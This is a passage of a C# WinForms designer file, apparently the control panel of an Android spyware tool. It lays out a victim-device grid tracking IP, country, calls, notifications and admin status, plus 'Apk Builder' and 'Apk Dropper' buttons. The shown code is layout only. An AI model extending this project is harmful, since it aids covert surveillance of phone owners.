            dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle2.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle2.Font = new System.Drawing.Font("Calibri", 12F);
            dataGridViewCellStyle2.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            dataGridViewCellStyle2.SelectionForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.ClientsWindow.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle2;
            this.ClientsWindow.ColumnHeadersHeight = 32;
            this.ClientsWindow.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
            this.ClientsWindow.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.cliscren,
            this.cliav,
            this.cliflg,
            this.cliname,
            this.clicountry,
            this.cliip,
            this.andver,
            this.phondmod,
            this.clinoti,
            this.clicalls,
            this.clibtry,
            this.cliwifi,
            this.cliavt,
            this.defcli,
            this.isadmincli,
            this.clipng,
            this.instdate});
            this.ClientsWindow.ContextMenuStrip = this.ctxmenu;
            this.ClientsWindow.Cursor = System.Windows.Forms.Cursors.Default;
            dataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle3.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle3.Font = new System.Drawing.Font("Calibri", 12F);
            dataGridViewCellStyle3.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle3.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            dataGridViewCellStyle3.SelectionForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle3.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
            this.ClientsWindow.DefaultCellStyle = dataGridViewCellStyle3;
            this.ClientsWindow.EnableHeadersVisualStyles = false;
            this.ClientsWindow.Font = new System.Drawing.Font("Calibri", 12F);
            this.ClientsWindow.GridColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.ClientsWindow.Location = new System.Drawing.Point(197, 87);
            this.ClientsWindow.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.ClientsWindow.Name = "ClientsWindow";
            this.ClientsWindow.ReadOnly = true;
            this.ClientsWindow.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.ClientsWindow.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            dataGridViewCellStyle4.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle4.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle4.Font = new System.Drawing.Font("Calibri", 12F);
            dataGridViewCellStyle4.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle4.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            dataGridViewCellStyle4.SelectionForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle4.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.ClientsWindow.RowHeadersDefaultCellStyle = dataGridViewCellStyle4;
            this.ClientsWindow.RowHeadersVisible = false;
            this.ClientsWindow.RowHeadersWidth = 62;
            dataGridViewCellStyle5.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle5.Font = new System.Drawing.Font("Calibri", 9F);
            dataGridViewCellStyle5.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle5.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            dataGridViewCellStyle5.SelectionForeColor = System.Drawing.Color.White;
            this.ClientsWindow.RowsDefaultCellStyle = dataGridViewCellStyle5;
            this.ClientsWindow.RowTemplate.Height = 29;
            this.ClientsWindow.SelectedIndex = -1;
            this.ClientsWindow.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
            this.ClientsWindow.ShowEditingIcon = false;
            this.ClientsWindow.Size = new System.Drawing.Size(1420, 666);
            this.ClientsWindow.StripeEvenColor = System.Drawing.Color.Black;
            this.ClientsWindow.StripeOddColor = System.Drawing.Color.Black;
            this.ClientsWindow.Style = DrakeUI.Framework.UIStyle.Custom;
            this.ClientsWindow.StyleCustomMode = true;
            this.ClientsWindow.TabIndex = 35;
            this.ClientsWindow.TabStop = false;
            this.ClientsWindow.CellEndEdit += new System.Windows.Forms.DataGridViewCellEventHandler(this.ClientsWindow_CellEndEdit);
            this.ClientsWindow.CellMouseClick += new System.Windows.Forms.DataGridViewCellMouseEventHandler(this.ClientsWindow_CellMouseClick);
            // 
            // cliscren
            // 
            this.cliscren.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
            this.cliscren.FillWeight = 69.79166F;
            this.cliscren.HeaderText = "";
            this.cliscren.MinimumWidth = 8;
            this.cliscren.Name = "cliscren";
            this.cliscren.ReadOnly = true;
            this.cliscren.Width = 8;
            // 
            // cliav
            // 
            this.cliav.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
            this.cliav.FillWeight = 41.875F;
            this.cliav.HeaderText = "";
            this.cliav.MinimumWidth = 8;
            this.cliav.Name = "cliav";
            this.cliav.ReadOnly = true;
            // 
            // cliflg
            // 
            this.cliflg.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
            this.cliflg.FillWeight = 19.62855F;
            this.cliflg.HeaderText = "";
            this.cliflg.MinimumWidth = 8;
            this.cliflg.Name = "cliflg";
            this.cliflg.ReadOnly = true;
            this.cliflg.Width = 8;
            // 
            // cliname
            // 
            this.cliname.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
            this.cliname.FillWeight = 88.32849F;
            this.cliname.HeaderText = "";
            this.cliname.MinimumWidth = 8;
            this.cliname.Name = "cliname";
            this.cliname.ReadOnly = true;
            this.cliname.Width = 21;
            // 
            // clicountry
            // 
            this.clicountry.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.None;
            this.clicountry.FillWeight = 49.07139F;
            this.clicountry.HeaderText = "";
            this.clicountry.MinimumWidth = 8;
            this.clicountry.Name = "clicountry";
            this.clicountry.ReadOnly = true;
            this.clicountry.Width = 130;
            // 
            // cliip
            // 
            this.cliip.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.None;
            this.cliip.FillWeight = 38.17664F;
            this.cliip.HeaderText = "";
            this.cliip.MinimumWidth = 8;
            this.cliip.Name = "cliip";
            this.cliip.ReadOnly = true;
            this.cliip.Width = 8;
            // 
            // andver
            // 
            this.andver.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.None;
            this.andver.FillWeight = 49.07139F;
            this.andver.HeaderText = "";
            this.andver.MinimumWidth = 8;
            this.andver.Name = "andver";
            this.andver.ReadOnly = true;
            this.andver.Width = 200;
            // 
            // phondmod
            // 
            this.phondmod.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.None;
            this.phondmod.FillWeight = 49.07139F;
            this.phondmod.HeaderText = "";
            this.phondmod.MinimumWidth = 8;
            this.phondmod.Name = "phondmod";
            this.phondmod.ReadOnly = true;
            this.phondmod.Width = 150;
            // 
            // clinoti
            // 
            this.clinoti.FillWeight = 14.72142F;
            this.clinoti.HeaderText = "";
            this.clinoti.MinimumWidth = 8;
            this.clinoti.Name = "clinoti";
            this.clinoti.ReadOnly = true;
            // 
            // clicalls
            // 
            this.clicalls.FillWeight = 14.72142F;
            this.clicalls.HeaderText = "";
            this.clicalls.MinimumWidth = 8;
            this.clicalls.Name = "clicalls";
            this.clicalls.ReadOnly = true;
            // 
            // clibtry
            // 
            this.clibtry.FillWeight = 34.34997F;
            this.clibtry.HeaderText = "";
            this.clibtry.MinimumWidth = 8;
            this.clibtry.Name = "clibtry";
            this.clibtry.ReadOnly = true;
            // 
            // cliwifi
            // 
            this.cliwifi.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.None;
            this.cliwifi.FillWeight = 34.34997F;
            this.cliwifi.HeaderText = "";
            this.cliwifi.MinimumWidth = 8;
            this.cliwifi.Name = "cliwifi";
            this.cliwifi.ReadOnly = true;
            this.cliwifi.Width = 8;
            // 
            // cliavt
            // 
            this.cliavt.FillWeight = 58.88566F;
            this.cliavt.HeaderText = "";
            this.cliavt.MinimumWidth = 8;
            this.cliavt.Name = "cliavt";
            this.cliavt.ReadOnly = true;
            // 
            // defcli
            // 
            this.defcli.FillWeight = 39.25711F;
            this.defcli.HeaderText = "";
            this.defcli.MinimumWidth = 8;
            this.defcli.Name = "defcli";
            this.defcli.ReadOnly = true;
            // 
            // isadmincli
            // 
            this.isadmincli.FillWeight = 24.53569F;
            this.isadmincli.HeaderText = "";
            this.isadmincli.MinimumWidth = 8;
            this.isadmincli.Name = "isadmincli";
            this.isadmincli.ReadOnly = true;
            // 
            // clipng
            // 
            this.clipng.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.DisplayedCells;
            this.clipng.FillWeight = 15F;
            this.clipng.HeaderText = "";
            this.clipng.MinimumWidth = 8;
            this.clipng.Name = "clipng";
            this.clipng.ReadOnly = true;
            this.clipng.Width = 21;
            // 
            // instdate
            // 
            this.instdate.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.None;
            this.instdate.FillWeight = 44.16425F;
            this.instdate.HeaderText = "";
            this.instdate.MinimumWidth = 8;
            this.instdate.Name = "instdate";
            this.instdate.ReadOnly = true;
            this.instdate.Width = 8;
            // 
            // drakeUITitleLine1
            // 
            this.drakeUITitleLine1.FillColor = System.Drawing.Color.Black;
            this.drakeUITitleLine1.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F);
            this.drakeUITitleLine1.LineColor = System.Drawing.Color.Red;
            this.drakeUITitleLine1.LineSize = 2;
            this.drakeUITitleLine1.Location = new System.Drawing.Point(156, 293);
            this.drakeUITitleLine1.Margin = new System.Windows.Forms.Padding(4);
            this.drakeUITitleLine1.MinimumSize = new System.Drawing.Size(3, 2);
            this.drakeUITitleLine1.Name = "drakeUITitleLine1";
            this.drakeUITitleLine1.Size = new System.Drawing.Size(35, 12);
            this.drakeUITitleLine1.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUITitleLine1.TabIndex = 128;
            this.drakeUITitleLine1.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
            this.drakeUITitleLine1.TextInterval = 1000000;
            // 
            // guna2Panel3
            // 
            this.guna2Panel3.BorderColor = System.Drawing.Color.Red;
            this.guna2Panel3.BorderThickness = 2;
            this.guna2Panel3.Controls.Add(this.ClientsButton);
            this.guna2Panel3.Controls.Add(this.Guna2GradientButton20);
            this.guna2Panel3.Controls.Add(this.PictureBox9);
            this.guna2Panel3.Controls.Add(this.drakeUITitleLine1);
            this.guna2Panel3.Controls.Add(this.ClientsClearLogs);
            this.guna2Panel3.Controls.Add(this.pictureBox4);
            this.guna2Panel3.Controls.Add(this.bigtitletext);
            this.guna2Panel3.Controls.Add(this.pictureBox5);
            this.guna2Panel3.Controls.Add(this.guna2GradientButton3);
            this.guna2Panel3.Controls.Add(this.guna2Panel2);
            this.guna2Panel3.Controls.Add(this.pictureBox3);
            this.guna2Panel3.Controls.Add(this.drakeUIButtonIcon3);
            this.guna2Panel3.Controls.Add(this.Guna2GradientButton22);
            this.guna2Panel3.Controls.Add(this.guna2GradientButton4);
            this.guna2Panel3.Controls.Add(this.drakeUIMeter1);
            this.guna2Panel3.Controls.Add(this.AlertButton);
            this.guna2Panel3.Controls.Add(this.toblocktext);
            this.guna2Panel3.Controls.Add(this.ClientsLogs);
            this.guna2Panel3.Location = new System.Drawing.Point(2260, 58);
            this.guna2Panel3.Margin = new System.Windows.Forms.Padding(4);
            this.guna2Panel3.Name = "guna2Panel3";
            this.guna2Panel3.Size = new System.Drawing.Size(104, 357);
            this.guna2Panel3.TabIndex = 56;
            // 
            // ClientsButton
            // 
            this.ClientsButton.Animated = true;
            this.ClientsButton.BorderRadius = 6;
            this.ClientsButton.BorderThickness = 1;
            this.ClientsButton.Cursor = System.Windows.Forms.Cursors.Hand;
            this.ClientsButton.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.ClientsButton.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.ClientsButton.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.ClientsButton.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.ClientsButton.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.ClientsButton.FillColor = System.Drawing.Color.Black;
            this.ClientsButton.FillColor2 = System.Drawing.Color.Black;
            this.ClientsButton.Font = new System.Drawing.Font("Candara", 12F, System.Drawing.FontStyle.Bold);
            this.ClientsButton.ForeColor = System.Drawing.Color.Red;
            this.ClientsButton.HoverState.BorderColor = System.Drawing.Color.Red;
            this.ClientsButton.HoverState.FillColor = System.Drawing.Color.Black;
            this.ClientsButton.HoverState.FillColor2 = System.Drawing.Color.Black;
            this.ClientsButton.HoverState.ForeColor = System.Drawing.Color.White;
            this.ClientsButton.Image = global::Eagle_Spy_Applications.icons8_client_1001;
            this.ClientsButton.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.ClientsButton.ImageSize = new System.Drawing.Size(35, 35);
            this.ClientsButton.Location = new System.Drawing.Point(149, 22);
            this.ClientsButton.Margin = new System.Windows.Forms.Padding(4);
            this.ClientsButton.Name = "ClientsButton";
            this.ClientsButton.Size = new System.Drawing.Size(171, 70);
            this.ClientsButton.TabIndex = 122;
            this.ClientsButton.Text = "    Clients";
            this.ClientsButton.Click += new System.EventHandler(this.ClientsButton_Click);
            // 
            // Guna2GradientButton20
            // 
            this.Guna2GradientButton20.BorderRadius = 6;
            this.Guna2GradientButton20.BorderThickness = 1;
            this.Guna2GradientButton20.Cursor = System.Windows.Forms.Cursors.Hand;
            this.Guna2GradientButton20.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.Guna2GradientButton20.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.Guna2GradientButton20.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.Guna2GradientButton20.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.Guna2GradientButton20.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.Guna2GradientButton20.FillColor = System.Drawing.Color.Black;
            this.Guna2GradientButton20.FillColor2 = System.Drawing.Color.Black;
            this.Guna2GradientButton20.Font = new System.Drawing.Font("Candara", 12F, System.Drawing.FontStyle.Bold);
            this.Guna2GradientButton20.ForeColor = System.Drawing.Color.Red;
            this.Guna2GradientButton20.HoverState.BorderColor = System.Drawing.Color.Red;
            this.Guna2GradientButton20.HoverState.FillColor = System.Drawing.Color.Black;
            this.Guna2GradientButton20.HoverState.FillColor2 = System.Drawing.Color.Black;
            this.Guna2GradientButton20.HoverState.ForeColor = System.Drawing.Color.White;
            this.Guna2GradientButton20.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.Guna2GradientButton20.ImageSize = new System.Drawing.Size(25, 25);
            this.Guna2GradientButton20.Location = new System.Drawing.Point(88, 48);
            this.Guna2GradientButton20.Margin = new System.Windows.Forms.Padding(4);
            this.Guna2GradientButton20.Name = "Guna2GradientButton20";
            this.Guna2GradientButton20.Size = new System.Drawing.Size(181, 70);
            this.Guna2GradientButton20.TabIndex = 121;
            this.Guna2GradientButton20.Text = "      Apk Builder";
            this.Guna2GradientButton20.TextAlign = System.Windows.Forms.HorizontalAlignment.Right;
            this.Guna2GradientButton20.Click += new System.EventHandler(this.Guna2GradientButton20_Click);
            // 
            // PictureBox9
            // 
            this.PictureBox9.Cursor = System.Windows.Forms.Cursors.Hand;
            this.PictureBox9.Location = new System.Drawing.Point(-61, -57);
            this.PictureBox9.Margin = new System.Windows.Forms.Padding(4);
            this.PictureBox9.Name = "PictureBox9";
            this.PictureBox9.Size = new System.Drawing.Size(35, 31);
            this.PictureBox9.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.PictureBox9.TabIndex = 97;
            this.PictureBox9.TabStop = false;
            this.PictureBox9.Click += new System.EventHandler(this.PictureBox9_Click);
            // 
            // ClientsClearLogs
            // 
            this.ClientsClearLogs.BorderRadius = 6;
            this.ClientsClearLogs.BorderThickness = 1;
            this.ClientsClearLogs.Cursor = System.Windows.Forms.Cursors.Hand;
            this.ClientsClearLogs.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.ClientsClearLogs.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.ClientsClearLogs.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.ClientsClearLogs.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.ClientsClearLogs.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.ClientsClearLogs.FillColor = System.Drawing.Color.Black;
            this.ClientsClearLogs.FillColor2 = System.Drawing.Color.Black;
            this.ClientsClearLogs.Font = new System.Drawing.Font("Candara", 12F, System.Drawing.FontStyle.Bold);
            this.ClientsClearLogs.ForeColor = System.Drawing.Color.Red;
            this.ClientsClearLogs.HoverState.BorderColor = System.Drawing.Color.Red;
            this.ClientsClearLogs.HoverState.FillColor = System.Drawing.Color.Black;
            this.ClientsClearLogs.HoverState.FillColor2 = System.Drawing.Color.Black;
            this.ClientsClearLogs.HoverState.ForeColor = System.Drawing.Color.White;
            this.ClientsClearLogs.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.ClientsClearLogs.ImageSize = new System.Drawing.Size(25, 25);
            this.ClientsClearLogs.Location = new System.Drawing.Point(132, 53);
            this.ClientsClearLogs.Margin = new System.Windows.Forms.Padding(4);
            this.ClientsClearLogs.Name = "ClientsClearLogs";
            this.ClientsClearLogs.Size = new System.Drawing.Size(179, 70);
            this.ClientsClearLogs.TabIndex = 123;
            this.ClientsClearLogs.Text = "Clear Logs";
            this.ClientsClearLogs.TextAlign = System.Windows.Forms.HorizontalAlignment.Right;
            // 
            // pictureBox4
            // 
            this.pictureBox4.Image = global::Eagle_Spy_Applications.icons8_cloud_641;
            this.pictureBox4.Location = new System.Drawing.Point(56, -31);
            this.pictureBox4.Margin = new System.Windows.Forms.Padding(4);
            this.pictureBox4.Name = "pictureBox4";
            this.pictureBox4.Size = new System.Drawing.Size(77, 76);
            this.pictureBox4.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox4.TabIndex = 143;
            this.pictureBox4.TabStop = false;
            // 
            // pictureBox5
            // 
            this.pictureBox5.Image = global::Eagle_Spy_Applications.icons8_target_audience_68;
            this.pictureBox5.Location = new System.Drawing.Point(56, 100);
            this.pictureBox5.Margin = new System.Windows.Forms.Padding(4);
            this.pictureBox5.Name = "pictureBox5";
            this.pictureBox5.Size = new System.Drawing.Size(77, 76);
            this.pictureBox5.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox5.TabIndex = 131;
            this.pictureBox5.TabStop = false;
            // 
            // guna2GradientButton3
            // 
            this.guna2GradientButton3.BorderRadius = 6;
            this.guna2GradientButton3.BorderThickness = 1;
            this.guna2GradientButton3.Cursor = System.Windows.Forms.Cursors.Hand;
            this.guna2GradientButton3.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.guna2GradientButton3.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.guna2GradientButton3.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2GradientButton3.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2GradientButton3.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.guna2GradientButton3.FillColor = System.Drawing.Color.Black;
            this.guna2GradientButton3.FillColor2 = System.Drawing.Color.Black;
            this.guna2GradientButton3.Font = new System.Drawing.Font("Candara", 12F, System.Drawing.FontStyle.Bold);
            this.guna2GradientButton3.ForeColor = System.Drawing.Color.Red;
            this.guna2GradientButton3.HoverState.BorderColor = System.Drawing.Color.Red;
            this.guna2GradientButton3.HoverState.FillColor = System.Drawing.Color.Black;
            this.guna2GradientButton3.HoverState.FillColor2 = System.Drawing.Color.Black;
            this.guna2GradientButton3.HoverState.ForeColor = System.Drawing.Color.White;
            this.guna2GradientButton3.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.guna2GradientButton3.ImageSize = new System.Drawing.Size(25, 25);
            this.guna2GradientButton3.Location = new System.Drawing.Point(132, 76);
            this.guna2GradientButton3.Margin = new System.Windows.Forms.Padding(4);
            this.guna2GradientButton3.Name = "guna2GradientButton3";
            this.guna2GradientButton3.Size = new System.Drawing.Size(173, 70);
            this.guna2GradientButton3.TabIndex = 125;
            this.guna2GradientButton3.Text = "Block List";
            this.guna2GradientButton3.TextAlign = System.Windows.Forms.HorizontalAlignment.Right;
            this.guna2GradientButton3.Click += new System.EventHandler(this.guna2GradientButton3_Click);
            // 
            // guna2Panel2
            // 
            this.guna2Panel2.BackgroundImage = global::Eagle_Spy_Applications._as;
            this.guna2Panel2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.guna2Panel2.BorderColor = System.Drawing.Color.Black;
            this.guna2Panel2.BorderThickness = 2;
            this.guna2Panel2.Location = new System.Drawing.Point(189, 244);
            this.guna2Panel2.Margin = new System.Windows.Forms.Padding(4);
            this.guna2Panel2.Name = "guna2Panel2";
            this.guna2Panel2.Size = new System.Drawing.Size(48, 42);
            this.guna2Panel2.TabIndex = 55;
            this.guna2Panel2.TabStop = true;
            // 
            // pictureBox3
            // 
            this.pictureBox3.BackgroundImage = global::Eagle_Spy_Applications.icons8_cloud_64__1_1;
            this.pictureBox3.Location = new System.Drawing.Point(56, 202);
            this.pictureBox3.Margin = new System.Windows.Forms.Padding(4);
            this.pictureBox3.Name = "pictureBox3";
            this.pictureBox3.Size = new System.Drawing.Size(58, 49);
            this.pictureBox3.SizeMode = System.Windows.Forms.PictureBoxSizeMode.AutoSize;
            this.pictureBox3.TabIndex = 140;
            this.pictureBox3.TabStop = false;
            // 
            // drakeUIButtonIcon3
            // 
            this.drakeUIButtonIcon3.Cursor = System.Windows.Forms.Cursors.Hand;
            this.drakeUIButtonIcon3.FillColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon3.FillDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon3.FillHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon3.FillPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon3.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon3.Font = new System.Drawing.Font("Candara", 12F, System.Drawing.FontStyle.Bold);
            this.drakeUIButtonIcon3.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon3.ForeDisableColor = System.Drawing.Color.Red;
            this.drakeUIButtonIcon3.ForeHoverColor = System.Drawing.Color.Blue;
            this.drakeUIButtonIcon3.ForePressColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon3.ForeSelectedColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon3.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.drakeUIButtonIcon3.Location = new System.Drawing.Point(180, 75);
            this.drakeUIButtonIcon3.Margin = new System.Windows.Forms.Padding(4);
            this.drakeUIButtonIcon3.Name = "drakeUIButtonIcon3";
            this.drakeUIButtonIcon3.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
            this.drakeUIButtonIcon3.RectColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon3.RectDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon3.RectHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon3.RectPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon3.RectSelectedColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon3.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
            this.drakeUIButtonIcon3.Size = new System.Drawing.Size(163, 69);
            this.drakeUIButtonIcon3.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUIButtonIcon3.Symbol = 61832;
            this.drakeUIButtonIcon3.SymbolSize = 30;
            this.drakeUIButtonIcon3.TabIndex = 128;
            this.drakeUIButtonIcon3.Text = "Apk Dropper";
            this.drakeUIButtonIcon3.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
            this.drakeUIButtonIcon3.TipsFont = new System.Drawing.Font("Bahnschrift", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.drakeUIButtonIcon3.Click += new System.EventHandler(this.drakeUIButtonIcon3_Click_1);
            // 
            // Guna2GradientButton22
            // 
            this.Guna2GradientButton22.BorderRadius = 6;
            this.Guna2GradientButton22.BorderThickness = 1;
            this.Guna2GradientButton22.Cursor = System.Windows.Forms.Cursors.Hand;
            this.Guna2GradientButton22.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.Guna2GradientButton22.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.Guna2GradientButton22.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.Guna2GradientButton22.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.Guna2GradientButton22.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.Guna2GradientButton22.FillColor = System.Drawing.Color.Black;
            this.Guna2GradientButton22.FillColor2 = System.Drawing.Color.Black;
            this.Guna2GradientButton22.Font = new System.Drawing.Font("Candara", 12F, System.Drawing.FontStyle.Bold);
            this.Guna2GradientButton22.ForeColor = System.Drawing.Color.Red;
            this.Guna2GradientButton22.HoverState.BorderColor = System.Drawing.Color.Red;
            this.Guna2GradientButton22.HoverState.FillColor = System.Drawing.Color.Black;
            this.Guna2GradientButton22.HoverState.FillColor2 = System.Drawing.Color.Black;
            this.Guna2GradientButton22.HoverState.ForeColor = System.Drawing.Color.White;
            this.Guna2GradientButton22.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.Guna2GradientButton22.ImageSize = new System.Drawing.Size(25, 25);
            this.Guna2GradientButton22.Location = new System.Drawing.Point(156, 87);
            this.Guna2GradientButton22.Margin = new System.Windows.Forms.Padding(4);
            this.Guna2GradientButton22.Name = "Guna2GradientButton22";
            this.Guna2GradientButton22.Size = new System.Drawing.Size(185, 55);
            this.Guna2GradientButton22.TabIndex = 127;
            this.Guna2GradientButton22.Text = "Clients Folder";
            this.Guna2GradientButton22.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.Guna2GradientButton22.Click += new System.EventHandler(this.Guna2GradientButton22_Click);
            // 
            // guna2GradientButton4
            // 
            this.guna2GradientButton4.BorderRadius = 6;
            this.guna2GradientButton4.BorderThickness = 1;
            this.guna2GradientButton4.Cursor = System.Windows.Forms.Cursors.Hand;
            this.guna2GradientButton4.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.guna2GradientButton4.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.guna2GradientButton4.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2GradientButton4.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2GradientButton4.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.guna2GradientButton4.FillColor = System.Drawing.Color.Black;
            this.guna2GradientButton4.FillColor2 = System.Drawing.Color.Black;
            this.guna2GradientButton4.Font = new System.Drawing.Font("Candara", 12F, System.Drawing.FontStyle.Bold);
            this.guna2GradientButton4.ForeColor = System.Drawing.Color.Red;
